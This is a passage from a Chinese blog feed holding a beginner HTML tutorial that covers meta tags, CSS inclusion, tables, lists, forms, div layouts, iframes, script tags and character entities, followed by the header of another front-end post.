JavaScript&quot;&gt;</span><br></pre></td></tr></table></figure><p>为网页定义描述内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;</span><br></pre></td></tr></table></figure><p>定义网页作者:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;</span><br></pre></td></tr></table></figure><p>每30秒钟刷新当前页面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>&lt;script&gt;</code> 元素：加载脚本文件，如js</p></li></ol><h1 id="css"><a class="markdownIt-Anchor" href="#css"></a> CSS</h1><ol><li><p><strong>定义</strong>：给HTML元素添加样式，可以更好地渲染元素</p><p>CSS 可以通过以下方式添加到HTML中:</p><ul><li><p>内联样式：在HTML元素中使用&quot;style&quot; <strong>属性</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:blue;margin-left:20px;&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>内部样式表：在HTML文档头部 <code>&lt;head&gt;</code> 区域使用 <code>&lt;style&gt;</code> <strong>元素</strong> 来包含CSS</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:yellow;&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">color</span>:blue;&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>外部引用：使用外部 CSS <strong>文件</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>最好的方式是通过外部引用CSS文件。</p></li></ol><h1 id="html表格"><a class="markdownIt-Anchor" href="#html表格"></a> HTML表格</h1><ol><li><p><strong>定义</strong></p><p>HTML 表格由 <code>&lt;table&gt;</code> 标签来定义。包括tr、td、th三个标签：</p><ul><li><p><strong>tr</strong>：tr 是 table row 的缩写，表示表格的一行。</p></li><li><p><strong>td</strong>：td 是 table data 的缩写，表示表格的数据单元格。</p></li><li><p><strong>th</strong>：th 是 table header的缩写，表示表格的表头单元格。通过使用 <code>&lt;th&gt;</code> 元素定义列标题，可以使其在表格中以粗体显示，与普通单元格区分开来。</p></li><li><p><strong><code>&lt;thead&gt;</code></strong> ：用于定义表格的标题部分</p></li><li><p>**<code>&lt;tbody&gt;</code>  **：用于定义表格的主体部分</p></li></ul></li><li><p><strong>示例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>列标题1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>列标题2<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>列标题3<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行1，列1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行1，列2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行1，列3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行2，列1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行2，列2<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>行2，列3<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HTML 表格还可以具有其他部分，如 <code>&lt;tfoot&gt; </code>（表格页脚）和 <code>&lt;caption&gt;</code> （表格标题），<code>&lt;tfoot&gt;</code> 可用于在表格的底部定义摘要、统计信息等内容。 <code>&lt;caption&gt;</code> 可用于为整个表格定义标题。</p><p>HTML 表格还支持合并单元格和跨行/跨列的操作，以及其他样式和属性的应用，以满足各种需求。我们也可以使用 CSS 来进一步自定义表格的样式和外观。</p></li></ol><h1 id="html列表"><a class="markdownIt-Anchor" href="#html列表"></a> HTML列表</h1><ol><li><p><strong>无序列表</strong>：使用粗体圆点（典型的小黑圆圈）进行标记。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>有序列表</strong>：使用数字进行标记</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>自定义列表</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>- black hot drink<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>- white cold drink<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="html表单"><a class="markdownIt-Anchor" href="#html表单"></a> HTML表单</h1><p>HTML 表单用于收集用户的输入信息，表示文档中的一个区域，此区域包含交互控件，将用户收集到的信息发送到 Web 服务器。</p><p>HTML 表单通常包含各种输入字段、复选框、单选按钮、下拉列表等元素。</p><p>例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 文本输入框 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 密码输入框 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 单选按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>性别:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;male&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;male&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;female&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;female&quot;</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 复选框 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;subscribe&quot;</span> <span class="attr">name</span>=<span class="string">&quot;subscribe&quot;</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;subscribe&quot;</span>&gt;</span>订阅推送信息<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 下拉列表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;country&quot;</span>&gt;</span>国家:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;country&quot;</span> <span class="attr">name</span>=<span class="string">&quot;country&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;cn&quot;</span>&gt;</span>CN<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;uk&quot;</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 提交按钮 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><code>&lt;form&gt;</code> 元素用于创建表单，<code>action</code> 属性定义了表单数据提交的目标 URL</p></li><li><p><code>method</code> 属性定义了提交数据的 HTTP 方法。</p><ul><li><strong>post</strong>：指的是 HTTP POST 方法，表单数据会包含在表单体内然后发送给服务器，用于提交敏感数据，如用户名与密码等。</li><li><strong>get</strong>：默认值，指的是 HTTP GET 方法，表单数据会附加在 <strong>action</strong> 属性的 URL 中，并以 <code>?</code>作为分隔符，一般用于不敏感信息，如分页等。例如：<a href="https://www.runoob.com/?page=1%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84">https://www.runoob.com/?page=1，这里的</a> page=1 就是 get 方法提交的数据。</li></ul></li><li><p><code>&lt;label&gt;</code> 元素用于为表单元素添加标签，提高可访问性。</p></li><li><p><code>&lt;input&gt;</code> 元素是最常用的表单元素之一，它可以创建文本输入框、密码框、单选按钮、复选框等。<code>type</code> 属性定义了输入框的类型，<code>id</code> 属性用于关联 <code>&lt;label&gt;</code> 元素，<code>name</code> 属性用于标识表单字段。</p><ul><li><p>常见的type属性类型</p><ul><li><p>text</p></li><li><p>password：不会明文显示</p></li><li><p>radio：单选</p></li><li><p>checkbox：复选</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;vehicle[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bike&quot;</span>&gt;</span>我喜欢自行车<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;vehicle[]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Car&quot;</span>&gt;</span>我喜欢小汽车</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240710193501024.png" alt="image-20240710193501024" /></p></li><li><p>submit：提交</p></li></ul></li></ul></li><li><p><code>&lt;select&gt;</code> 元素用于创建下拉列表，而 <code>&lt;option&gt;</code> 元素用于定义下拉列表中的选项。</p></li></ul><h1 id="布局"><a class="markdownIt-Anchor" href="#布局"></a> 布局</h1><p>布局即为：将内容安排到多个列中（像杂志或报纸那样），可以使用<code>&lt;div&gt;</code> 或 <code>&lt;table&gt;</code> 来实现。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:500px&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;header&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#FFA500;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;margin-bottom:0;&quot;</span>&gt;</span>主要的网页标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;menu&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#FFD700;height:200px;width:100px;float:left;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>菜单<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">HTML<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">CSS<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">JavaScript<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#EEEEEE;height:200px;width:400px;float:left;&quot;</span>&gt;</span></span><br><span class="line">内容在这里<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#FFA500;clear:both;text-align:center;&quot;</span>&gt;</span></span><br><span class="line">版权 © runoob.com<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><ul><li><code>&lt;div id=&quot;container&quot; style=&quot;width:500px&quot;&gt;</code> ：整个页面容器，宽度为500像素</li><li><code>&lt;div id=&quot;header&quot;&gt;</code> ：页眉部分，背景色为橙色。</li><li><code>&lt;div id=&quot;menu&quot;&gt;</code> ：菜单部分，背景色为淡黄色，高度200像素，宽度100像素，并使用了float:left;使其浮动在左侧。</li><li><code>&lt;div id=&quot;content&quot;&gt;</code> ：内容部分，背景色为淡灰色，高度200像素，宽度400像素，并使用了float:left;使其浮动在左侧，使得菜单和内容并排显示。</li><li><code>&lt;div id=&quot;footer&quot;&gt;</code> ：页脚部分，背景色为橙色，使用了clear:both;确保在内容下方显示，并设置了居中对齐。</li></ul></blockquote><p>由于创建高级的布局非常耗时，使用模板是一个快速的选项。通过搜索引擎可以找到很多免费的网站模板（您可以使用这些预先构建好的网站布局，并优化它们）。</p><h1 id="iframe框架"><a class="markdownIt-Anchor" href="#iframe框架"></a> iframe(框架)</h1><p>通过使用 iframe，你可以在同一个浏览器窗口中显示不止一个页面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;URL&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><strong>使用 iframe 来显示目标链接页面</strong></p><p>iframe 可以显示一个目标链接的页面，目标链接的属性必须使用 iframe 的属性，如下实例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;demo_iframe.htm&quot;</span> <span class="attr">name</span>=<span class="string">&quot;iframe_a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;iframe_a&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener&quot;</span>&gt;</span>RUNOOB.COM<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240710194643458.png" alt="image-20240710194643458" /></p><p>点击之后，iframe中就会显示指向的url</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240710194655201.png" alt="image-20240710194655201" /></p><h1 id="html脚本"><a class="markdownIt-Anchor" href="#html脚本"></a> HTML脚本</h1><ul><li><p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。<code>&lt;script&gt;</code> 元素既可包含脚本语句，也可通过 src 属性指向外部脚本文件。通常用于图片操作、表单验证以及内容动态更新。</p></li><li><p><code>&lt;noscript&gt;</code>  元素可包含普通 HTML 页面的 body 元素中能够找到的所有元素。</p><p>只有在浏览器不支持脚本或者禁用脚本时，才会显示 <code>&lt;noscript&gt;</code> 元素中的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&quot;Hello World!&quot;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;noscript&gt;抱歉，你的浏览器不支持 JavaScript!&lt;/noscript&gt;</span><br></pre></td></tr></table></figure></li></ul><p>关于JS的学习会另写一篇博客</p><h1 id="html字符实体"><a class="markdownIt-Anchor" href="#html字符实体"></a> HTML字符实体</h1><p>在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。如果想要显示这些字符，我们需要将这些预留字符替换为字符实体</p><table><thead><tr><th style="text-align:left">显示结果</th><th style="text-align:left">描述</th><th style="text-align:left">实体名称</th><th style="text-align:left">实体编号</th></tr></thead><tbody><tr><td style="text-align:left"></td><td style="text-align:left">空格</td><td style="text-align:left"> </td><td style="text-align:left"> </td></tr><tr><td style="text-align:left">&lt;</td><td style="text-align:left">小于号</td><td style="text-align:left">&lt;</td><td style="text-align:left">&lt;</td></tr><tr><td style="text-align:left">&gt;</td><td style="text-align:left">大于号</td><td style="text-align:left">&gt;</td><td style="text-align:left">&gt;</td></tr><tr><td style="text-align:left">&amp;</td><td style="text-align:left">和号</td><td style="text-align:left">&amp;</td><td style="text-align:left">&amp;</td></tr><tr><td style="text-align:left">&quot;</td><td style="text-align:left">引号</td><td style="text-align:left">&quot;</td><td style="text-align:left">&quot;</td></tr><tr><td style="text-align:left">’</td><td style="text-align:left">撇号</td><td style="text-align:left">' (IE不支持)</td><td style="text-align:left">'</td></tr><tr><td style="text-align:left">￠</td><td style="text-align:left">分</td><td style="text-align:left">¢</td><td style="text-align:left">¢</td></tr><tr><td style="text-align:left">£</td><td style="text-align:left">镑</td><td style="text-align:left">£</td><td style="text-align:left">£</td></tr><tr><td style="text-align:left">¥</td><td style="text-align:left">人民币/日元</td><td style="text-align:left">¥</td><td style="text-align:left">¥</td></tr><tr><td style="text-align:left">€</td><td style="text-align:left">欧元</td><td style="text-align:left">€</td><td style="text-align:left">€</td></tr><tr><td style="text-align:left">§</td><td style="text-align:left">小节</td><td style="text-align:left">§</td><td style="text-align:left">§</td></tr><tr><td style="text-align:left">©</td><td style="text-align:left">版权</td><td style="text-align:left">©</td><td style="text-align:left">©</td></tr><tr><td style="text-align:left">®</td><td style="text-align:left">注册商标</td><td style="text-align:left">®</td><td style="text-align:left">®</td></tr><tr><td style="text-align:left">™</td><td style="text-align:left">商标</td><td style="text-align:left">™</td><td style="text-align:left">™</td></tr><tr><td style="text-align:left">×</td><td style="text-align:left">乘号</td><td style="text-align:left">×</td><td style="text-align:left">×</td></tr><tr><td style="text-align:left">÷</td><td style="text-align:left">除号</td><td style="text-align:left">÷</td><td style="text-align:left">÷</td></tr></tbody></table><ul><li><p>HTML 中的常用字符实体是不间断空格 <code>&amp;nbsp; </code>。</p><p>**浏览器总是会截短 HTML 页面中的空格。如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个。**如需在页面中增加空格的数量，您需要使用 <code>&amp;nbsp; </code>字符实体。</p></li><li><p>URL同样也需要转换成 ASCII 格式</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端开发 </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web前端开发』前端开发技术架构和学习路线</title>
      <link href="/posts/cf4f.html"/>
      <url>/posts/cf4f.html</url>
